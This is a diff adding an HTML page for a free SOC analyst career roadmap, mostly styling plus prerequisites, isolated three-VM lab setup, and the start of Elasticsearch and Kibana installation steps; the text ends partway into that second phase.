@@ -1,0 +1,2374 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>SOC Analyst Roadmap — Free Community Guide</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#080c10;--surface:#0d1219;--surface2:#111822;--border:#1a2535;
+  --accent:#00d4ff;--accent2:#00ff88;--accent3:#ff6b35;
+  --text:#e8edf2;--muted:#4a6070;
+  --mono:'Space Mono',monospace;--sans:'DM Sans',sans-serif;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:var(--sans);line-height:1.6;overflow-x:hidden}
+body::before{content:'';position:fixed;inset:0;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)' opacity='0.04'/%3E%3C/svg%3E");pointer-events:none;z-index:0;opacity:.4}
+body::after{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(0,212,255,.025) 1px,transparent 1px),linear-gradient(90deg,rgba(0,212,255,.025) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0}
+
+nav{position:fixed;top:0;left:0;right:0;z-index:100;padding:14px 20px;display:flex;justify-content:space-between;align-items:center;background:rgba(8,12,16,.92);backdrop-filter:blur(16px);border-bottom:1px solid var(--border)}
+.nav-logo{font-family:var(--mono);font-size:11px;font-weight:700;color:var(--accent);line-height:1.3}
+.nav-links{display:flex;gap:12px}
+.nav-link{font-family:var(--mono);font-size:9px;color:var(--muted);text-decoration:none;letter-spacing:.06em;text-transform:uppercase;transition:color .2s}
+.nav-link:hover{color:var(--accent)}
+
+/* HERO */
+.hero{position:relative;min-height:100vh;display:flex;flex-direction:column;justify-content:center;padding:100px 20px 80px;z-index:1}
+.scanline{position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,var(--accent),transparent);animation:scan 5s linear infinite;opacity:.15}
+.hero-tag{display:inline-flex;align-items:center;gap:8px;background:rgba(0,255,136,.06);border:1px solid rgba(0,255,136,.2);border-radius:20px;padding:6px 14px;margin-bottom:28px;animation:fadeUp .8s ease both}
+.hero-tag-dot{width:7px;height:7px;background:var(--accent2);border-radius:50%;animation:pulse 2s infinite}
+.hero-tag-text{font-family:var(--mono);font-size:10px;color:var(--accent2);letter-spacing:.08em;text-transform:uppercase}
+.hero-title{font-family:var(--mono);font-size:clamp(32px,8vw,72px);font-weight:700;line-height:1;color:var(--text);animation:fadeUp .8s .1s ease both;opacity:0}
+.hero-title span{color:var(--accent);display:block}
+.hero-sub{font-size:clamp(14px,3vw,18px);color:#6a8090;margin-top:18px;max-width:580px;line-height:1.7;animation:fadeUp .8s .2s ease both;opacity:0}
+.hero-sub strong{color:var(--accent2)}
+.hero-meta{margin-top:32px;display:flex;flex-direction:column;gap:10px;animation:fadeUp .8s .3s ease both;opacity:0}
+.hero-meta-item{display:flex;align-items:flex-start;gap:10px;font-size:13px;color:#5a7080}
+.hero-meta-item span{color:var(--accent);font-family:var(--mono);font-size:11px;flex-shrink:0;margin-top:2px}
+.hero-author{margin-top:36px;padding:16px 18px;background:var(--surface);border:1px solid var(--border);border-radius:10px;border-left:3px solid var(--accent);max-width:480px;animation:fadeUp .8s .4s ease both;opacity:0}
+.hero-author-label{font-family:var(--mono);font-size:9px;color:var(--muted);letter-spacing:.1em;text-transform:uppercase;margin-bottom:8px}
+.hero-author-name{font-size:15px;font-weight:600;color:var(--text)}
+.hero-author-role{font-size:12px;color:var(--muted);margin-top:3px}
+.hero-author-certs{display:flex;flex-wrap:wrap;gap:5px;margin-top:10px}
+.acert{font-family:var(--mono);font-size:9px;padding:3px 8px;border-radius:3px;border:1px solid rgba(0,255,136,.2);color:var(--accent2);background:rgba(0,255,136,.04)}
+.acert.ip{border-color:rgba(0,212,255,.2);color:var(--accent);background:rgba(0,212,255,.04)}
+.hero-cta{display:flex;gap:10px;margin-top:32px;flex-wrap:wrap;animation:fadeUp .8s .5s ease both;opacity:0}
+.btn{font-family:var(--mono);font-size:10px;padding:11px 20px;border-radius:5px;text-decoration:none;letter-spacing:.06em;cursor:pointer;border:none;transition:all .2s;display:inline-block}
+.btn-primary{background:var(--accent);color:#000;font-weight:700}
+.btn-primary:hover{background:#33ddff}
+.btn-ghost{background:transparent;color:var(--accent);border:1px solid rgba(0,212,255,.3)}
+.btn-ghost:hover{border-color:var(--accent);background:rgba(0,212,255,.06)}
+
+.divider{height:1px;background:linear-gradient(90deg,transparent,var(--border),transparent)}
+section{position:relative;z-index:1;padding:70px 20px}
+.eyebrow{font-family:var(--mono);font-size:10px;color:var(--accent);letter-spacing:.14em;text-transform:uppercase;margin-bottom:14px;display:flex;align-items:center;gap:10px}
+.eyebrow::after{content:'';flex:1;height:1px;background:var(--border)}
+.sec-title{font-size:clamp(26px,5vw,40px);font-weight:600;line-height:1.2;margin-bottom:10px}
+.sec-sub{font-size:14px;color:#5a7080;max-width:560px;line-height:1.7}
+.reveal{opacity:0;transform:translateY(18px);transition:opacity .7s ease,transform .7s ease}
+.reveal.visible{opacity:1;transform:none}
+
+/* BEFORE YOU START */
+.prereq-grid{display:grid;grid-template-columns:1fr;gap:10px;margin-top:32px}
+.prereq{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:18px 16px;display:flex;gap:14px;align-items:flex-start;transition:border-color .2s}
+.prereq:hover{border-color:rgba(0,212,255,.2)}
+.prereq-icon{font-size:20px;flex-shrink:0;margin-top:2px}
+.prereq-title{font-size:14px;font-weight:600;margin-bottom:5px;color:var(--text)}
+.prereq-desc{font-size:12px;color:#5a7080;line-height:1.6}
+.prereq-desc a{color:var(--accent);text-decoration:none}
+.prereq-desc a:hover{text-decoration:underline}
+
+/* PHASE ROADMAP */
+.phases-container{margin-top:36px}
+.phase-block{margin-bottom:14px;border:1px solid var(--border);border-radius:12px;overflow:hidden;background:var(--surface)}
+.phase-hdr{display:flex;align-items:center;gap:12px;padding:16px 18px;cursor:pointer;-webkit-tap-highlight-color:transparent;transition:background .2s}
+.phase-hdr:hover{background:var(--surface2)}
+.phase-num{width:32px;height:32px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:12px;font-weight:700;flex-shrink:0}
+.pn-blue{background:rgba(0,212,255,.1);color:var(--accent);border:1px solid rgba(0,212,255,.2)}
+.pn-green{background:rgba(0,255,136,.1);color:var(--accent2);border:1px solid rgba(0,255,136,.2)}
+.pn-orange{background:rgba(255,107,53,.1);color:var(--accent3);border:1px solid rgba(255,107,53,.2)}
+.pn-purple{background:rgba(180,100,255,.1);color:#ce93d8;border:1px solid rgba(180,100,255,.2)}
+.phase-hdr-info{flex:1}
+.phase-hdr-title{font-size:14px;font-weight:600;color:var(--text)}
+.phase-hdr-meta{font-size:11px;color:var(--muted);margin-top:2px}
+.phase-tags{display:flex;flex-wrap:wrap;gap:4px;margin-top:6px}
+.ptag{font-size:9px;padding:2px 7px;border-radius:3px;background:rgba(0,212,255,.06);color:var(--accent);border:1px solid rgba(0,212,255,.12);font-family:var(--mono)}
+.ptag.g{background:rgba(0,255,136,.06);color:var(--accent2);border-color:rgba(0,255,136,.12)}
+.ptag.o{background:rgba(255,107,53,.06);color:var(--accent3);border-color:rgba(255,107,53,.12)}
+.ptag.p{background:rgba(180,100,255,.06);color:#ce93d8;border-color:rgba(180,100,255,.12)}
+.phase-caret{font-size:11px;color:var(--muted);transition:transform .25s;flex-shrink:0}
+.phase-hdr.open .phase-caret{transform:rotate(90deg)}
+.phase-body{display:none;border-top:1px solid var(--border)}
+.phase-body.open{display:block}
+.phase-intro{padding:16px 18px 0;font-size:13px;color:#6a8090;line-height:1.7;border-bottom:1px solid var(--border);padding-bottom:16px}
+.steps-list{padding:16px 18px}
+.step-item{display:flex;gap:12px;margin-bottom:16px;align-items:flex-start}
+.step-item:last-child{margin-bottom:0}
+.step-n{min-width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:10px;font-weight:700;flex-shrink:0;margin-top:2px}
+.sn-blue{background:rgba(0,212,255,.1);color:var(--accent);border:1px solid rgba(0,212,255,.2)}
+.sn-green{background:rgba(0,255,136,.1);color:var(--accent2);border:1px solid rgba(0,255,136,.2)}
+.sn-orange{background:rgba(255,107,53,.1);color:var(--accent3);border:1px solid rgba(255,107,53,.2)}
+.sn-purple{background:rgba(180,100,255,.1);color:#ce93d8;border:1px solid rgba(180,100,255,.2)}
+.step-content{}
+.step-title{font-size:13px;font-weight:600;color:var(--text);margin-bottom:4px}
+.step-desc{font-size:12px;color:#5a7080;line-height:1.7}
+.step-desc a{color:var(--accent);text-decoration:none}
+.step-desc a:hover{text-decoration:underline}
+.step-desc code{font-family:var(--mono);font-size:10px;background:rgba(0,212,255,.08);border:1px solid rgba(0,212,255,.15);padding:1px 5px;border-radius:3px;color:var(--accent)}
+.step-note{margin-top:8px;padding:8px 12px;background:rgba(255,107,53,.06);border-left:2px solid var(--accent3);border-radius:0 5px 5px 0;font-size:11px;color:#cc8860;line-height:1.5}
+.step-tools{display:flex;flex-wrap:wrap;gap:4px;margin-top:8px}
+.stool{font-size:10px;padding:2px 8px;border-radius:4px;background:var(--surface2);color:var(--muted);border:1px solid var(--border);font-family:var(--mono)}
+.goal-box{margin:0 18px 18px;padding:12px 14px;background:rgba(0,255,136,.04);border:1px solid rgba(0,255,136,.15);border-radius:8px;font-size:12px;color:var(--accent2);line-height:1.5}
+.goal-box strong{font-family:var(--mono);font-size:10px;letter-spacing:.06em;display:block;margin-bottom:4px;opacity:.7}
+
+/* TRACK DIVIDER */
+.track-divider{display:flex;align-items:center;gap:12px;margin:32px 0 20px;padding:12px 16px;background:var(--surface);border-radius:8px;border-left:3px solid var(--accent)}
+.track-divider-icon{font-size:18px}
+.track-divider-title{font-size:14px;font-weight:600;color:var(--text)}
+.track-divider-sub{font-size:11px;color:var(--muted);margin-top:2px}
+
+/* CERTS */
+.certs-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:32px}
+.cert-card{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:16px 14px;transition:all .2s}
+.cert-card.earned{border-color:rgba(0,255,136,.2)}
+.cert-card:hover{border-color:rgba(0,212,255,.2)}
+.cert-top{display:flex;justify-content:space-between;align-items:flex-start;gap:6px;margin-bottom:7px}
+.cert-name{font-family:var(--mono);font-size:11px;font-weight:700}
+.cn-g{color:var(--accent2)}.cn-b{color:var(--accent)}.cn-m{color:var(--muted)}
+.cbadge{font-size:8px;padding:2px 5px;border-radius:3px;font-family:var(--mono);font-weight:700;white-space:nowrap}
+.cb-earned{background:rgba(0,255,136,.1);color:var(--accent2);border:1px solid rgba(0,255,136,.2)}
+.cb-ip{background:rgba(0,212,255,.1);color:var(--accent);border:1px solid rgba(0,212,255,.2)}
+.cb-next{background:rgba(255,107,53,.1);color:var(--accent3);border:1px solid rgba(255,107,53,.2)}
+.cb-plan{background:rgba(74,96,112,.1);color:var(--muted);border:1px solid var(--border)}
+.cert-desc{font-size:11px;color:var(--muted);line-height:1.5}
+
+/* SALARY */
+.salary-box{margin-top:36px;background:linear-gradient(135deg,rgba(0,212,255,.06),rgba(0,255,136,.04));border:1px solid rgba(0,212,255,.2);border-radius:14px;padding:32px 24px;text-align:center;position:relative;overflow:hidden}
+.salary-box::before{content:'';position:absolute;top:-1px;left:10%;right:10%;height:1px;background:linear-gradient(90deg,transparent,var(--accent),transparent)}
+.salary-label{font-family:var(--mono);font-size:10px;color:var(--muted);letter-spacing:.1em;text-transform:uppercase;margin-bottom:12px}
+.salary-role{font-size:18px;font-weight:600;color:var(--text);margin-bottom:16px}
+.salary-num{font-family:var(--mono);font-size:clamp(36px,8vw,64px);font-weight:700;color:var(--accent2);line-height:1}
+.salary-range{font-size:13px;color:var(--muted);margin-top:8px}
+.salary-desc{font-size:13px;color:#5a7080;max-width:420px;margin:16px auto 0;line-height:1.6}
+
+/* TIMELINE */
+.tl{margin-top:32px}
+.tl-item{display:flex;gap:14px;padding-bottom:24px}
+.tl-item:last-child{padding-bottom:0}
+.tl-col{display:flex;flex-direction:column;align-items:center;flex-shrink:0}
+.tl-d{width:12px;height:12px;border-radius:50%;flex-shrink:0}
+.tl-d.done{background:var(--accent2);box-shadow:0 0 8px rgba(0,255,136,.4)}
+.tl-d.now{background:var(--accent);box-shadow:0 0 12px rgba(0,212,255,.5);animation:pulse 2s infinite}
+.tl-d.future{background:transparent;border:2px solid var(--border)}
+.tl-l{width:1px;flex:1;background:var(--border);margin-top:4px}
+.tl-body{padding-top:0}
+.tl-date{font-family:var(--mono);font-size:10px;color:var(--muted);letter-spacing:.06em;margin-bottom:4px}
+.tl-title{font-size:14px;font-weight:600;color:var(--text)}
+.now-badge{display:inline-block;font-family:var(--mono);font-size:8px;padding:2px 6px;border-radius:3px;background:rgba(0,212,255,.1);color:var(--accent);border:1px solid rgba(0,212,255,.2);margin-left:8px;vertical-align:middle}
+.tl-desc{font-size:12px;color:var(--muted);margin-top:4px;line-height:1.6}
+
+/* BUILD LOGS */
+.logs-intro{margin-top:20px;padding:14px 16px;background:rgba(0,255,136,.04);border-left:3px solid var(--accent2);border-radius:0 8px 8px 0;font-size:13px;color:#7a9080;line-height:1.6}
+.logs-intro strong{color:var(--accent2);font-family:var(--mono);font-size:11px;letter-spacing:.06em}
+.logs-stack{margin-top:28px;display:flex;flex-direction:column;gap:14px}
+.log-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;overflow:hidden;transition:border-color .2s}
+.log-card:hover{border-color:rgba(0,255,136,.25)}
+.log-card-hdr{display:flex;align-items:center;gap:14px;padding:18px;cursor:pointer;-webkit-tap-highlight-color:transparent}
+.log-day{width:48px;height:48px;border-radius:10px;background:rgba(0,255,136,.08);border:1px solid rgba(0,255,136,.2);display:flex;flex-direction:column;align-items:center;justify-content:center;flex-shrink:0;font-family:var(--mono)}
+.log-day-label{font-size:8px;color:var(--accent2);letter-spacing:.1em;text-transform:uppercase;line-height:1}
+.log-day-num{font-size:18px;font-weight:700;color:var(--accent2);line-height:1;margin-top:2px}
+.log-info{flex:1;min-width:0}
+.log-date{font-family:var(--mono);font-size:9px;color:var(--muted);letter-spacing:.08em;text-transform:uppercase;margin-bottom:4px}
+.log-title{font-size:14px;font-weight:600;color:var(--text);line-height:1.3}
+.log-phases{display:flex;flex-wrap:wrap;gap:5px;margin-top:8px}
+.log-phase-tag{font-family:var(--mono);font-size:9px;padding:3px 8px;border-radius:4px;background:rgba(0,212,255,.06);color:var(--accent);border:1px solid rgba(0,212,255,.15)}
+.log-phase-tag.done{background:rgba(0,255,136,.06);color:var(--accent2);border-color:rgba(0,255,136,.2)}
+.log-caret{font-size:11px;color:var(--muted);transition:transform .25s;flex-shrink:0}
+.log-card-hdr.open .log-caret{transform:rotate(90deg)}
+.log-body{display:none;padding:0 18px 18px;border-top:1px solid var(--border);margin-top:0}
+.log-body.open{display:block}
+.log-body-inner{padding-top:16px}
+.log-section{margin-bottom:16px}
+.log-section:last-child{margin-bottom:0}
+.log-section-title{font-family:var(--mono);font-size:10px;color:var(--accent);letter-spacing:.1em;text-transform:uppercase;margin-bottom:10px}
+.log-list{list-style:none;padding:0}
+.log-list li{font-size:12px;color:#6a8090;line-height:1.7;padding-left:18px;position:relative;margin-bottom:5px}
+.log-list li::before{content:'✓';position:absolute;left:0;color:var(--accent2);font-size:11px;font-weight:700}
+.log-list li code{font-family:var(--mono);font-size:10px;background:rgba(0,212,255,.08);border:1px solid rgba(0,212,255,.15);padding:1px 5px;border-radius:3px;color:var(--accent)}
+.log-issues-list{list-style:none;padding:0}
+.log-issues-list li{font-size:12px;color:#cc8860;line-height:1.7;padding-left:22px;position:relative;margin-bottom:8px}
+.log-issues-list li::before{content:'⚠';position:absolute;left:0;color:var(--accent3);font-size:12px;font-weight:700}
+.log-issues-list li code{font-family:var(--mono);font-size:10px;background:rgba(255,107,53,.08);border:1px solid rgba(255,107,53,.15);padding:1px 5px;border-radius:3px;color:var(--accent3)}
+.log-issues-list li strong{color:#e89070}
+.log-cta{display:inline-flex;align-items:center;gap:6px;margin-top:12px;font-family:var(--mono);font-size:10px;padding:8px 14px;background:transparent;border:1px solid rgba(0,212,255,.25);border-radius:5px;color:var(--accent);text-decoration:none;letter-spacing:.06em;transition:all .2s}
+.log-cta:hover{background:rgba(0,212,255,.06);border-color:var(--accent)}
+.log-coming-soon{padding:24px 18px;text-align:center;background:var(--surface);border:1px dashed var(--border);border-radius:12px;margin-top:14px}
+.log-coming-soon-title{font-family:var(--mono);font-size:11px;color:var(--muted);letter-spacing:.08em;text-transform:uppercase;margin-bottom:6px}
+.log-coming-soon-text{font-size:12px;color:var(--muted);line-height:1.6}
+
+/* TOOLS */
+.tools-wrap{display:flex;flex-wrap:wrap;gap:7px;margin-top:28px}
+.tool-pill{font-family:var(--mono);font-size:10px;padding:5px 11px;border-radius:4px;border:1px solid var(--border);color:var(--muted);background:var(--surface)}
+.tool-pill.free{border-color:rgba(0,255,136,.2);color:var(--accent2);background:rgba(0,255,136,.04)}
+.tool-pill.paid{border-color:rgba(255,107,53,.2);color:var(--accent3);background:rgba(255,107,53,.04)}
+
+/* CTA */
+.cta-section{background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:36px 24px;text-align:center;margin-top:40px;position:relative;overflow:hidden}
+.cta-section::before{content:'';position:absolute;top:-1px;left:20%;right:20%;height:1px;background:linear-gradient(90deg,transparent,var(--accent),transparent)}
+.cta-title{font-family:var(--mono);font-size:18px;font-weight:700;color:var(--text);margin-bottom:10px}
+.cta-sub{font-size:13px;color:var(--muted);margin-bottom:24px;line-height:1.6;max-width:420px;margin-left:auto;margin-right:auto}
+.cta-btns{display:flex;gap:10px;justify-content:center;flex-wrap:wrap}
+
+footer{position:relative;z-index:1;padding:48px 20px;border-top:1px solid var(--border);text-align:center}
+.footer-title{font-family:var(--mono);font-size:14px;font-weight:700;color:var(--accent);margin-bottom:6px}
+.footer-sub{font-size:12px;color:var(--muted)}
+.footer-links{display:flex;justify-content:center;gap:8px;flex-wrap:wrap;margin-top:16px}
+.footer-link{font-family:var(--mono);font-size:10px;color:var(--muted);text-decoration:none;padding:6px 12px;border:1px solid var(--border);border-radius:4px;transition:all .2s}
+.footer-link:hover{border-color:rgba(0,212,255,.3);color:var(--accent)}
+.footer-copy{font-size:10px;color:#1e2e3a;margin-top:24px;font-family:var(--mono)}
+
+@keyframes fadeUp{from{opacity:0;transform:translateY(18px)}to{opacity:1;transform:translateY(0)}}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+@keyframes scan{0%{top:-2px;opacity:.2}100%{top:100%;opacity:0}}
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="nav-logo">SOC Analyst Roadmap<br>by Mohammed Al-Majeed</div>
+  <div class="nav-links">
+    <a href="#roadmap" class="nav-link">Roadmap</a>
+    <a href="#certs" class="nav-link">Certs</a>
+    <a href="#logs" class="nav-link">Logs</a>
+    <a href="#journey" class="nav-link">Journey</a>
+  </div>
+</nav>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="scanline"></div>
+  <div class="hero-tag">
+    <div class="hero-tag-dot"></div>
+    <span class="hero-tag-text">Free community resource — updated as I learn</span>
+  </div>
+  <h1 class="hero-title">Become a<span>SOC Analyst</span></h1>
+  <p class="hero-sub">A <strong>free, step-by-step roadmap</strong> built by someone actively on this journey. No fluff. No paywalls. Just the exact labs, tools, and steps you need to go from zero hands-on experience to SOC Analyst.</p>
+  <div class="hero-meta">
+    <div class="hero-meta-item"><span>→</span> Covers everything from lab setup to threat hunting to cloud security monitoring</div>
+    <div class="hero-meta-item"><span>→</span> Every tool listed is free or low cost — no expensive bootcamps needed</div>
+    <div class="hero-meta-item"><span>→</span> Built for anyone with a laptop and the drive to put in the work</div>
+  </div>
+  <div class="hero-author">
+    <div class="hero-author-label">Built and maintained by</div>
+    <div class="hero-author-name">Mohammed Al-Majeed</div>
+    <div class="hero-author-role">Cloud & Network Operations → SOC Analyst (in progress)</div>
+    <div class="hero-author-certs">
+      <span class="acert">Security+</span>
+      <span class="acert">Network+</span>
+      <span class="acert">CySA+</span>
+      <span class="acert ip">AWS Security → In Progress</span>
+    </div>
+  </div>
+  <div class="hero-cta">
+    <a href="#roadmap" class="btn btn-primary">Start the Roadmap</a>
+    <a href="https://www.linkedin.com/in/mohammed-majeed-40a661271" class="btn btn-ghost">Follow on LinkedIn</a>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<!-- BEFORE YOU START -->
+<section id="start">
+  <div class="eyebrow">00 — Before You Start</div>
+  <h2 class="sec-title reveal">What You Need</h2>
+  <p class="sec-sub reveal">Before touching a single lab — get these sorted. This is your foundation.</p>
+
+  <div class="prereq-grid reveal">
+    <div class="prereq">
+      <div class="prereq-icon">💻</div>
+      <div>
+        <div class="prereq-title">A decent laptop or PC</div>
+        <div class="prereq-desc">Minimum: <strong>16GB RAM, 256GB SSD, Intel i5 or AMD Ryzen 5</strong>. You need RAM to run multiple VMs simultaneously. A refurbished ThinkPad T14 or Dell Latitude with 16GB runs around $250–300 on eBay or Best Buy refurbished. 32GB RAM is ideal. Do NOT use a machine with 8GB — you'll fight your setup more than you learn.</div>
+      </div>
+    </div>
+    <div class="prereq">
+      <div class="prereq-icon">🆓</div>
+      <div>
+        <div class="prereq-title">Free accounts to create right now</div>
+        <div class="prereq-desc">
+          <a href="https://github.com" target="_blank">GitHub</a> — your portfolio lives here<br>
+          <a href="https://tryhackme.com" target="_blank">TryHackMe</a> — guided learning rooms<br>
+          <a href="https://letsdefend.io" target="_blank">LetsDefend</a> — SOC alert queue simulator<br>
+          <a href="https://cyberdefenders.org" target="_blank">CyberDefenders</a> — investigation labs<br>
+          <a href="https://virustotal.com" target="_blank">VirusTotal</a> — IOC lookups<br>
+          <a href="https://any.run" target="_blank">Any.run</a> — malware sandbox<br>
+          <a href="https://urlscan.io" target="_blank">URLScan.io</a> — URL analysis
+        </div>
+      </div>
+    </div>
+    <div class="prereq">
+      <div class="prereq-icon">📥</div>
+      <div>
+        <div class="prereq-title">Downloads needed for your lab</div>
+        <div class="prereq-desc">
+          <a href="https://www.virtualbox.org/wiki/Downloads" target="_blank">VirtualBox</a> — free VM software (Windows/Mac Intel)<br>
+          <a href="https://mac.getutm.app" target="_blank">UTM</a> — free VM software (Mac Apple Silicon only)<br>
+          <a href="https://ubuntu.com/download/server" target="_blank">Ubuntu Server 22.04 LTS</a> — your SIEM host<br>
+          <a href="https://www.kali.org/get-kali/" target="_blank">Kali Linux</a> — your attacker machine<br>
+          <a href="https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise" target="_blank">Windows 10 Enterprise Eval</a> — free 90-day trial
+        </div>
+      </div>
+    </div>
+    <div class="prereq">
+      <div class="prereq-icon">🧠</div>
+      <div>
+        <div class="prereq-title">Mindset going in</div>
+        <div class="prereq-desc">This roadmap is hands-on. You learn by doing, not watching. Every phase ends with a written report or working detection — no exceptions. Document everything in GitHub from day one. Hiring managers can't see what you don't show them. The goal is to be able to talk about real things you built, not hypothetical skills.</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<div class="divider"></div>
+
+<!-- ROADMAP -->
+<section id="roadmap">
+  <div class="eyebrow">01 — The Roadmap</div>
+  <h2 class="sec-title reveal">The Complete Path</h2>
+  <p class="sec-sub reveal">8 tracks. 26 phases. SOC L1 → SOC L2 → Cybersecurity Analyst. Every phase builds on the last.</p>
+
+  <div class="tracks reveal">
+
+    <!-- TRACK 1 DIVIDER -->
+    <div class="track-divider">
+      <div class="track-divider-icon">🖥️</div>
+      <div>
+        <div class="track-divider-title">Track 1 — Build Your SOC Lab</div>
+        <div class="track-divider-sub">Set up your 3-VM lab, deploy Elastic SIEM, Wazuh XDR, Suricata IDS, Sysmon, and Fleet.</div>
+      </div>
+    </div>
+<!-- PHASE 01 -->
+    <div class="phase-block">
+      <div class="phase-hdr" onclick="togglePhase(this)">
+        <div class="phase-num pn-blue">01</div>
+        <div class="phase-hdr-info">
+          <div class="phase-hdr-title">Set Up Your Virtual Lab Environment</div>
+          <div class="phase-hdr-meta">VirtualBox or UTM · 3 VMs · isolated network · ~3 hours</div>
+          <div class="phase-tags"><span class="ptag">VirtualBox</span><span class="ptag">Ubuntu Server</span><span class="ptag">Kali Linux</span><span class="ptag">Windows 10</span><span class="ptag">Networking</span></div>
+        </div>
+        <div class="phase-caret">▶</div>
+      </div>
+      <div class="phase-body">
+        <div class="phase-intro">Your lab is the foundation for everything else. You need 3 virtual machines — one as your SIEM (Ubuntu), one as your victim endpoint (Windows), and one as your attacker (Kali). They need to communicate with each other but be isolated from your real network.</div>
+        <div class="steps-list">
+          <div class="step-item">
+            <div class="step-n sn-blue">1</div>
+            <div class="step-content">
+              <div class="step-title">Install your hypervisor</div>
+              <div class="step-desc">Windows or Intel Mac: download <a href="https://www.virtualbox.org/wiki/Downloads" target="_blank">VirtualBox</a> and the Extension Pack from the same page. Apple Silicon Mac (M1/M2/M3): download <a href="https://mac.getutm.app" target="_blank">UTM</a> instead — VirtualBox does not work on Apple Silicon.</div>
+              <div class="step-tools"><span class="stool">VirtualBox</span><span class="stool">UTM (Mac only)</span></div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">2</div>
+            <div class="step-content">
+              <div class="step-title">Download your 3 OS images</div>
+              <div class="step-desc">
+                <a href="https://ubuntu.com/download/server" target="_blank">Ubuntu Server 22.04 LTS</a> → your SIEM host<br>
+                <a href="https://www.kali.org/get-kali/" target="_blank">Kali Linux</a> → your attacker node (use Virtual Machine pre-built image)<br>
+                <a href="https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise" target="_blank">Windows 10 Enterprise Evaluation</a> → free 90-day trial, your victim endpoint<br><br>
+                <strong>Apple Silicon Mac users:</strong> download the ARM64 versions of Ubuntu and the Apple Silicon Kali image. Windows installs via UTM Gallery automatically.
+              </div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">3</div>
+            <div class="step-content">
+              <div class="step-title">Create your 3 VMs with these specs</div>
+              <div class="step-desc">
+                <strong>SIEM-Ubuntu:</strong> 4–6GB RAM, 50GB storage, 2 CPUs<br>
+                <strong>WIN10-Victim:</strong> 4–6GB RAM, 60GB storage, 2 CPUs<br>
+                <strong>Kali-Attacker:</strong> 2–4GB RAM, 40GB storage, 2 CPUs<br><br>
+                Install each OS. Ubuntu: username <code>socadmin</code>, enable OpenSSH. Windows: skip Microsoft account, create local user. Kali: default login is <code>kali/kali</code> — change password immediately.
+              </div>
+              <div class="step-note">If you have 16GB RAM: run 2 VMs at a time max. If you have 32GB: run all 3 simultaneously.</div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">4</div>
+            <div class="step-content">
+              <div class="step-title">Configure isolated networking</div>
+              <div class="step-desc">In VirtualBox: each VM → Settings → Network → set to <strong>Host-Only Adapter</strong>. Give Kali a second adapter set to NAT so it can reach the internet for tool downloads. Boot each VM and confirm they can ping each other. This keeps your attack simulations off your real home network.</div>
+              <div class="step-tools"><span class="stool">VirtualBox Network Manager</span><span class="stool">Host-Only Adapter</span><span class="stool">NAT</span></div>
+            </div>
+          </div>
+        </div>
+        <div class="goal-box"><strong>PHASE GOAL</strong>All 3 VMs boot and can ping each other. You're ready to build your detection stack on top.</div>
+      </div>
+    </div>
+
+    <!-- PHASE 02 -->
+    <div class="phase-block">
+      <div class="phase-hdr" onclick="togglePhase(this)">
+        <div class="phase-num pn-blue">02</div>
+        <div class="phase-hdr-info">
+          <div class="phase-hdr-title">Deploy Elastic SIEM + Suricata IDS</div>
+          <div class="phase-hdr-meta">Elastic 8 · Kibana · Sysmon · Suricata · Fleet · ~4 hours</div>
+          <div class="phase-tags"><span class="ptag">Elasticsearch</span><span class="ptag">Kibana</span><span class="ptag">Sysmon</span><span class="ptag">Suricata</span><span class="ptag">Fleet</span><span class="ptag">Dashboards</span></div>
+        </div>
+        <div class="phase-caret">▶</div>
+      </div>
+      <div class="phase-body">
+        <div class="phase-intro">Elastic SIEM is your detection engine — every alert flows through here. Sysmon gives you deep Windows endpoint telemetry. Suricata gives you network-level detection. Together they cover both host and network visibility.</div>
+        <div class="steps-list">
+          <div class="step-item">
+            <div class="step-n sn-blue">1</div>
+            <div class="step-content">
+              <div class="step-title">Install Elasticsearch and Kibana on Ubuntu</div>
+              <div class="step-desc">SSH into your Ubuntu VM and run these commands one at a time:<br>
+              <code>sudo apt update && sudo apt upgrade -y</code><br>
+              <code>wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -</code><br>
+              <code>sudo apt install apt-transport-https -y</code><br>
+              <code>echo 'deb https://artifacts.elastic.co/packages/8.x/apt stable main' | sudo tee /etc/apt/sources.list.d/elastic-8.x.list</code><br>
+              <code>sudo apt update && sudo apt install elasticsearch kibana -y</code><br>
+              <code>sudo systemctl enable --now elasticsearch kibana</code><br>
+              Then reset the elastic password: <code>sudo /usr/share/elasticsearch/bin/elasticsearch-reset-password -u elastic</code> — save this password. Open your browser and go to <code>http://[ubuntu-ip]:5601</code> — Kibana should load.</div>
+            </div>
+          </div>
+          <div class="step-item">
+            <div class="step-n sn-blue">2</div>
